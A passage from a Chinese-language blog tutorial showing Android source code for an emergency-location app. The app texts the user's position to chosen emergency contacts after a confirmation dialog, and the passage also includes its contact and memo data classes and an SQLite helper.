class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div></pre></td><td class="code"><pre><div class="line">LocationActivity.java</div><div class="line">package com.haocong.test;</div><div class="line"></div><div class="line">import android.Manifest;</div><div class="line">import android.app.Activity;</div><div class="line">import android.app.AlertDialog;</div><div class="line">import android.content.DialogInterface;</div><div class="line">import android.content.pm.PackageManager;</div><div class="line">import android.os.Bundle;</div><div class="line">import android.content.Context;</div><div class="line">import android.os.Handler;</div><div class="line">import android.os.Message;</div><div class="line">import android.support.v4.app.ActivityCompat;</div><div class="line">import android.support.v4.content.ContextCompat;</div><div class="line">import android.telephony.SmsManager;</div><div class="line">import android.util.Log;</div><div class="line">import android.widget.Toast;</div><div class="line"></div><div class="line">import com.amap.api.location.*;</div><div class="line">import com.amap.api.maps2d.AMap;</div><div class="line">import com.amap.api.maps2d.CameraUpdateFactory;</div><div class="line">import com.amap.api.maps2d.LocationSource;</div><div class="line">import com.amap.api.location.AMapLocationListener;</div><div class="line">import com.amap.api.maps2d.MapView;</div><div class="line">import com.amap.api.maps2d.UiSettings;</div><div class="line">import com.amap.api.maps2d.model.BitmapDescriptorFactory;</div><div class="line">import com.amap.api.maps2d.model.LatLng;</div><div class="line">import com.amap.api.maps2d.model.MyLocationStyle;</div><div class="line"></div><div class="line">import java.text.SimpleDateFormat;</div><div class="line">import java.util.ArrayList;</div><div class="line">import java.util.Date;</div><div class="line">import java.util.List;</div><div class="line">import java.util.Timer;</div><div class="line">import java.util.TimerTask;</div><div class="line"></div><div class="line">/**</div><div class="line"> * Created by Dell-User on 2017/6/7.</div><div class="line"> */</div><div class="line"></div><div class="line">public class LocationActivity extends Activity  implements LocationSource, AMapLocationListener &#123;</div><div class="line">    private static final int WRITE_COARSE_LOCATION_REQUEST_CODE =1 ;</div><div class="line">    private boolean qx=false;</div><div class="line">    private AlertDialog alertDialog = null;//私有的对话框</div><div class="line">    private DelayCloseController delayCloseController = new DelayCloseController();</div><div class="line">    private class DelayCloseController extends TimerTask &#123;</div><div class="line">        private Timer timer = new Timer();</div><div class="line">        private int actionFlags = 1;//标志位参数</div><div class="line">        public void setCloseFlags(int flag)</div><div class="line">        &#123;</div><div class="line">            actionFlags = flag;</div><div class="line">        &#125;</div><div class="line">        @Override</div><div class="line">        public void run() &#123;</div><div class="line">            if(qx)</div><div class="line">                actionFlags=0;</div><div class="line">            Message messageFinish = new Message();</div><div class="line">            messageFinish.what = actionFlags ;</div><div class="line">            handle_send.sendMessage(messageFinish);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    private mem_DBServer db;</div><div class="line">    private List&lt;mem&gt;mem_arr=new ArrayList&lt;mem&gt;();</div><div class="line">    private List&lt;String&gt;set_num_arr=new ArrayList&lt;String&gt;();</div><div class="line">    private DB_all_Server db2;</div><div class="line">    AMap aMap = null;</div><div class="line">    MapView mapView = null;</div><div class="line">    boolean isFirstLoc = true;</div><div class="line">    //声明AMapLocationClient类对象</div><div class="line">    public AMapLocationClient mLocationClient = null;</div><div class="line">    //声明定位回调监听器</div><div class="line">    public AMapLocationListener mLocationListener;</div><div class="line">    //声明AMapLocationClientOption对象</div><div class="line">    public AMapLocationClientOption mLocationOption = null;</div><div class="line">    private String current_address,current_time;</div><div class="line">    //初始化AMapLocationClientOption对象</div><div class="line">    private Handler handle_send=new Handler()&#123;</div><div class="line">        @Override</div><div class="line">        public void handleMessage(Message msg) &#123;</div><div class="line">            if(msg.what==0)</div><div class="line">            &#123;</div><div class="line">                alertDialog.dismiss();  //关闭对话框</div><div class="line">            &#125;</div><div class="line">            else if(msg.what==1)</div><div class="line">            &#123;</div><div class="line">                for(int i=0;i&lt;set_num_arr.size();i++) &#123;</div><div class="line">                    sendSMSMessage(set_num_arr.get(i));</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    @Override</div><div class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.location);</div><div class="line">        db2=new DB_all_Server(this);</div><div class="line">        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)</div><div class="line">                != PackageManager.PERMISSION_GRANTED) &#123;</div><div class="line">            ActivityCompat.requestPermissions(this, new String[]&#123;Manifest.permission.ACCESS_COARSE_LOCATION&#125;, WRITE_COARSE_LOCATION_REQUEST_CODE);//自定义的code</div><div class="line">        &#125;</div><div class="line">        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)</div><div class="line">                != PackageManager.PERMISSION_GRANTED) &#123;</div><div class="line">            ActivityCompat.requestPermissions(this, new String[]&#123;Manifest.permission.WRITE_EXTERNAL_STORAGE&#125;, WRITE_COARSE_LOCATION_REQUEST_CODE);//自定义的code</div><div class="line">        &#125;</div><div class="line">        db=new mem_DBServer(this);</div><div class="line">        mem_arr=db.get_all_mem();</div><div class="line">        for(int i=0;i&lt;mem_arr.size();i++)&#123;</div><div class="line">            if(mem_arr.get(i).getSet_or_not().equals(&quot;是&quot;)) &#123;</div><div class="line">                set_num_arr.add(mem_arr.get(i).getPhone_num());</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        mapView = (MapView) findViewById(R.id.map);</div><div class="line">        mapView.onCreate(savedInstanceState);</div><div class="line">        if (aMap == null) &#123;</div><div class="line">            aMap = mapView.getMap();</div><div class="line">            UiSettings settings = aMap.getUiSettings();</div><div class="line">            aMap.setLocationSource(this);//设置了定位的监听,这里要实现LocationSource接口</div><div class="line">            // 是否显示定位按钮</div><div class="line">            settings.setMyLocationButtonEnabled(true);</div><div class="line">            aMap.setMyLocationEnabled(true);//显示定位层并且可以触发定位,默认是flase</div><div class="line">        &#125;</div><div class="line">        //初始化定位</div><div class="line">        mLocationClient = new AMapLocationClient(getApplicationContext());</div><div class="line">//设置定位回调监听</div><div class="line">        mLocationClient.setLocationListener(this);</div><div class="line">        mLocationOption = new AMapLocationClientOption();</div><div class="line">        //设置定位模式为AMapLocationMode.Hight_Accuracy，高精度模式。</div><div class="line">        mLocationOption.setLocationMode(AMapLocationClientOption.AMapLocationMode.Hight_Accuracy);</div><div class="line">        //设置是否返回地址信息（默认返回地址信息）</div><div class="line">        mLocationOption.setNeedAddress(true);</div><div class="line">        //设置是否只定位一次,默认为false</div><div class="line">        mLocationOption.setOnceLocation(false);</div><div class="line">        //设置是否强制刷新WIFI，默认为强制刷新</div><div class="line">        mLocationOption.setWifiActiveScan(true);</div><div class="line">        //设置是否允许模拟位置,默认为false，不允许模拟位置</div><div class="line">        mLocationOption.setMockEnable(false);</div><div class="line">        //设置定位间隔,单位毫秒,默认为2000ms</div><div class="line">        mLocationOption.setInterval(2000);</div><div class="line">        //给定位客户端对象设置定位参数</div><div class="line">        mLocationClient.setLocationOption(mLocationOption);</div><div class="line">        //启动定位</div><div class="line">        mLocationClient.startLocation();</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    protected void onResume() &#123;</div><div class="line">        super.onResume();</div><div class="line">        //在activity执行onResume时执行mMapView.onResume ()，重新绘制加载地图</div><div class="line">        mapView.onResume();</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    public void onLocationChanged(AMapLocation aMapLocation) &#123;</div><div class="line"></div><div class="line">aMap.getUiSettings().setMyLocationButtonEnabled(true);//设置默认定位按钮是否显示，非必需设置。</div><div class="line">        aMap.setMyLocationEnabled(true);// 设置为true表示启动显示定位蓝点，false表示隐藏定位蓝点并不进行定位，默认是false。</div><div class="line">        if (aMapLocation != null) &#123;</div><div class="line">            if (aMapLocation.getErrorCode() == 0) &#123;</div><div class="line">                //定位成功回调信息，设置相关消息</div><div class="line">                aMapLocation.getLocationType();//获取当前定位结果来源，如网络定位结果，详见官方定位类型表</div><div class="line">                aMapLocation.getLatitude();//获取纬度</div><div class="line">                aMapLocation.getLongitude();//获取经度</div><div class="line">                aMapLocation.getAccuracy();//获取精度信息</div><div class="line">                SimpleDateFormat df = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</div><div class="line">                Date date = new Date(aMapLocation.getTime());</div><div class="line">                df.format(date);//定位时间</div><div class="line">                aMapLocation.getAddress();//地址，如果option中设置isNeedAddress为false，则没有此结果，网络定位结果中会有地址信息，GPS定位不返回地址信息。</div><div class="line">                String address=date.toString()+&apos;\n&apos;+aMapLocation.getAddress();</div><div class="line">                current_address=aMapLocation.getAddress();</div><div class="line">                current_time=date.toString();</div><div class="line">                // 如果不设置标志位，此时再拖动地图时，它会不断将地图移动到当前的位置</div><div class="line">                if (isFirstLoc) &#123;</div><div class="line">                    Toast.makeText(getApplicationContext(),  address, Toast.LENGTH_LONG).show();</div><div class="line">                    //设置缩放级别</div><div class="line">                    aMap.moveCamera(CameraUpdateFactory.zoomTo(25));</div><div class="line">                    //将地图移动到定位点</div><div class="line">                    aMap.moveCamera(CameraUpdateFactory.changeLatLng(new LatLng(aMapLocation.getLatitude(), aMapLocation.getLongitude())));</div><div class="line">                    //点击定位按钮 能够将地图的中心移动到定位点</div><div class="line">                    isFirstLoc = false;</div><div class="line">                    windows(0);</div><div class="line">                    mLocationListener.onLocationChanged(aMapLocation);</div><div class="line">                    //获取定位信息</div><div class="line">                &#125;</div><div class="line">            &#125; else &#123;</div><div class="line">                //显示错误信息ErrCode是错误码，errInfo是错误信息，详见错误码表。</div><div class="line">                Log.e(&quot;AmapError&quot;, &quot;location Error, ErrCode:&quot;</div><div class="line">                        + aMapLocation.getErrorCode() + &quot;, errInfo:&quot;</div><div class="line">                        + aMapLocation.getErrorInfo());</div><div class="line">                Toast.makeText(getApplicationContext(), &quot;定位失败,请先设置权限&quot;, Toast.LENGTH_LONG).show();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    protected void onDestroy() &#123;</div><div class="line">        super.onDestroy();</div><div class="line">        mapView.onDestroy();</div><div class="line">        //mLocationClient.stopLocation();//停止定位</div><div class="line">        mLocationClient.onDestroy();//销毁定位客户端。</div><div class="line">        //销毁定位客户端之后，若要重新开启定位请重新New一个AMapLocationClient对象。</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    public void activate(OnLocationChangedListener onLocationChangedListener) &#123;</div><div class="line">//        isFirstLoc = true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    public void deactivate() &#123;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    protected void sendSMSMessage(String phoneNo) &#123;</div><div class="line">        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)</div><div class="line">                != PackageManager.PERMISSION_GRANTED) &#123;</div><div class="line">            ActivityCompat.requestPermissions(this, new String[]&#123;Manifest.permission.SEND_SMS&#125;, WRITE_COARSE_LOCATION_REQUEST_CODE);//自定义的code</div><div class="line">        &#125;</div><div class="line">        String message =&quot;(紧急提醒！)定位时间：&quot;+current_time+&quot;\n定位所在地点：&quot;+current_address;</div><div class="line">        String save=&quot;Position：&quot;+current_address;</div><div class="line">        bwl_instance t=new bwl_instance();</div><div class="line">        t.setInfo(save);</div><div class="line">        t.setType(&quot;定位记录&quot;);</div><div class="line">        t.setTime(current_time);</div><div class="line">        t.setImportance(&quot;重要&quot;);</div><div class="line">        t.setRem_time(&quot;×&quot;);</div><div class="line">        db2.add_bwl(t);</div><div class="line">        List&lt;mem&gt;temp=new ArrayList&lt;mem&gt;();</div><div class="line">        temp=db.FindMemByPhone_num(phoneNo);</div><div class="line">        try &#123;</div><div class="line">            SmsManager smsManager = SmsManager.getDefault();</div><div class="line">            ArrayList&lt;String&gt; texts = smsManager.divideMessage(message);</div><div class="line">            for(String text : texts)&#123;</div><div class="line">                smsManager.sendTextMessage(phoneNo, null, text, null, null);//分别发送每一条短信</div><div class="line">                for(int i=0;i&lt;temp.size();i++) &#123;</div><div class="line">                    Toast.makeText(getApplicationContext(), &quot;紧急定位信息已经发送给&quot; + temp.get(i).getName()+&quot;(&quot;+phoneNo+&quot;)&quot;,</div><div class="line">                            Toast.LENGTH_LONG).show();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125; catch (Exception e) &#123;</div><div class="line">            Toast.makeText(getApplicationContext(),</div><div class="line">                    &quot;短信发送失败.&quot;,</div><div class="line">                    Toast.LENGTH_LONG).show();</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    public void windows(int x) &#123;</div><div class="line">        if (x == 0) &#123;</div><div class="line">            alertDialog= new AlertDialog.Builder(this)</div><div class="line">                    .setTitle(&quot;系统提示：&quot;)</div><div class="line">                    .setMessage(&quot;确定发送紧急定位短信吗吗？（若10s后无确认将自动发送）&quot;)</div><div class="line">                    .setPositiveButton(&quot;确认发送&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 1;</div><div class="line">                            handle_send.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .setNegativeButton(&quot;取消&quot;, new DialogInterface.OnClickListener() &#123;</div><div class="line">                        @Override</div><div class="line">                        public void onClick(DialogInterface dialog, int which) &#123;</div><div class="line">                            // TODO Auto-generated method stub</div><div class="line">                            Message msg = new Message();</div><div class="line">                            msg.what = 0;</div><div class="line">                            qx=true;</div><div class="line">                            handle_send.sendMessage(msg);</div><div class="line">                        &#125;</div><div class="line">                    &#125;)</div><div class="line">                    .show();</div><div class="line">            delayCloseController.setCloseFlags(1);             //设置信息标志位</div><div class="line">            delayCloseController.timer.schedule(delayCloseController, 10000);   //启动定时器</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="重要-3-Android数据库构建"><a href="#重要-3-Android数据库构建" class="headerlink" title="(重要)3.Android数据库构建"></a>(重要)3.Android数据库构建</h1><ul>
<li>首先是mem类的构建(定义联系人实例mem的setter 和 getter等函数)，接着是bwl_instance类的构建(定义备忘录实例bwl_instance的setter和getter等函数)<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">mem.java：</div><div class="line">package com.haocong.test;</div><div class="line"></div><div class="line">/**</div><div class="line"> * Created by Dell-User on 2017/6/13.</div><div class="line"> */</div><div class="line"></div><div class="line">public class mem &#123;</div><div class="line">    private int mem_id;</div><div class="line">    private String name;</div><div class="line">    private String phone_num;</div><div class="line">    private String phone_type;</div><div class="line">    private String set_or_not;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    public String toString() &#123;</div><div class="line">        return &quot;\n编号：&quot;+getMem_id()+&quot;\n姓名：&quot;+getName()+&quot;\n号码：&quot;+getPhone_num()+&quot;\n号码类型：&quot;+getPhone_type()+&quot;\n是否为紧急联系人：&quot;+getSet_or_not();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public mem() &#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public int getMem_id() &#123;</div><div class="line">        return mem_id;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setMem_id(int mem_id) &#123;</div><div class="line">        this.mem_id = mem_id;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public String getPhone_num() &#123;</div><div class="line">        return phone_num;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setPhone_num(String phone_num) &#123;</div><div class="line">        this.phone_num = phone_num;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public String getPhone_type() &#123;</div><div class="line">        return phone_type;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setPhone_type(String phone_type) &#123;</div><div class="line">        this.phone_type = phone_type;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public String getName() &#123;</div><div class="line">        return name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setName(String name) &#123;</div><div class="line">        this.name = name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public String getSet_or_not() &#123;</div><div class="line">        return set_or_not;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setSet_or_not(String set_or_not) &#123;</div><div class="line">        this.set_or_not = set_or_not;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">bwl_instance.java:</div><div class="line">package com.haocong.test;</div><div class="line"></div><div class="line">/**</div><div class="line"> * Created by Dell-User on 2017/6/12.</div><div class="line"> */</div><div class="line"></div><div class="line">public class bwl_instance  &#123;</div><div class="line">    //有一个主键info_id是自动增长获取的</div><div class="line">    private  int info_id;</div><div class="line">    private  String info;</div><div class="line">    private String rem_time;</div><div class="line">    private String importance;</div><div class="line">    private String time;</div><div class="line">    private String type;</div><div class="line"></div><div class="line"></div><div class="line">    public String getInfo() &#123;</div><div class="line">        return info;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setInfo(String info) &#123;</div><div class="line">        this.info = info;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public String getRem_time() &#123;</div><div class="line">        return rem_time;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setRem_time(String rem_time) &#123;</div><div class="line">        this.rem_time = rem_time;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public String getImportance() &#123;</div><div class="line">        return importance;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setImportance(String importance) &#123;</div><div class="line">        this.importance = importance;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public String getTime() &#123;</div><div class="line">        return time;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setTime(String time) &#123;</div><div class="line">        this.time = time;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public String getType() &#123;</div><div class="line">        return type;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setType(String type) &#123;</div><div class="line">        this.type = type;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    public String toString() &#123;</div><div class="line">        return &quot;\n编号：&quot;+getInfo_id()+&quot;\n备忘类型：&quot;+getType()+&quot;\n备忘信息：&quot;+getInfo()+&quot;\n备忘时间：&quot;+getTime()+&quot;\n重要程度：&quot;+getImportance()+&quot;\n提醒间隔时间：&quot;+getRem_time();</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    public int getInfo_id() &#123;</div><div class="line">        return info_id;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public void setInfo_id(int info_id) &#123;</div><div class="line">        this.info_id = info_id;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后进行数据库的构建(两张表如下)<br><img src="http://op72m4y17.bkt.clouddn.com/52.png" alt=""><br>(包括直接群发短信和超过加速度阈值时自动发送定位短信给已设置为紧急联系的人的手机号码)<br>(加速度阈值的储存利用了此表，phone_num-&gt;加速度阈值大小，name-&gt;加速度阈值，其它字段不存有关信息，在正常显示联系人的情况下不显示加速度阈值，在主页通过筛选得到加速度阈值并加以显示)<br><img src="http://op72m4y17.bkt.clouddn.com/54.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div></pre></td><td class="code"><pre><div class="line">mem_DBServer.java</div><div class="line">package com.haocong.test;</div><div class="line"></div><div class="line">import android.content.Context;</div><div class="line">import android.database.Cursor;</div><div class="line">import android.database.sqlite.SQLiteDatabase;</div><div class="line">import android.widget.Toast;</div><div class="line"></div><div class="line">import java.util.ArrayList;</div><div class="line">import java.util.List;</div><div class="line"></div><div class="line">/**</div><div class="line"> * Created by Dell-User on 2017/6/13.</div><div class="line"> */</div><div class="line"></div><div class="line">public class mem_DBServer&#123;</div><div class="line">    private mem_DBHelper mem_dbHelper;</div><div class="line">    public mem_DBServer(Context context)&#123;</div><div class="line">        this.mem_dbHelper=new mem_DBHelper(context);</div><div class="line">    &#125;</div><div class="line">    public  void add_mem(mem x)&#123;</div><div class="line">//        private int mem_id;</div><div class="line">//        private String name;</div><div class="line">//        private String phone_num;</div><div class="line">//        private String phone_type;</div><div class="line">//        private String set_or_not;</div><div class="line">        Object[] arr=new Object[4];</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getWritableDatabase();</div><div class="line">        arr[0]=x.getName();</div><div class="line">        arr[1]=x.getPhone_num();</div><div class="line">        arr[2]=x.getPhone_type();</div><div class="line">        arr[3]=x.getSet_or_not();</div><div class="line">        localDatabase.execSQL(&quot;insert into mem_table (name,phone_num, phone_type, set_or_not) values(?,?,?,?)&quot;,arr);</div><div class="line">        localDatabase.close();</div><div class="line">    &#125;</div><div class="line">    public void del_mem(int i)&#123;</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getWritableDatabase();</div><div class="line">        localDatabase.execSQL(&quot;delete from mem_table where mem_id=?&quot;,new String[]&#123;i+&quot;&quot;&#125;);</div><div class="line">        localDatabase.close();</div><div class="line">    &#125;</div><div class="line">    public List&lt;mem&gt;get_all_mem()&#123;</div><div class="line">        //        private int mem_id;</div><div class="line">//        private String name;</div><div class="line">//        private String phone_num;</div><div class="line">//        private String phone_type;</div><div class="line">//        private String set_or_not;</div><div class="line">        List&lt;mem&gt;arr=new ArrayList&lt;mem&gt;();</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getReadableDatabase();</div><div class="line">        Cursor cursor=localDatabase.rawQuery(&quot;select * from mem_table where 1=1&quot;,null);</div><div class="line">        while(cursor.moveToNext())&#123;</div><div class="line">            if(cursor.getString(cursor.getColumnIndex(&quot;name&quot;)).equals(&quot;加速度阈值&quot;))&#123;</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line">            mem temp=new mem();</div><div class="line">            temp.setMem_id(cursor.getInt(0));</div><div class="line">            temp.setName(cursor.getString(cursor.getColumnIndex(&quot;name&quot;)));</div><div class="line">            temp.setPhone_num(cursor.getString(cursor.getColumnIndex(&quot;phone_num&quot;)));</div><div class="line">            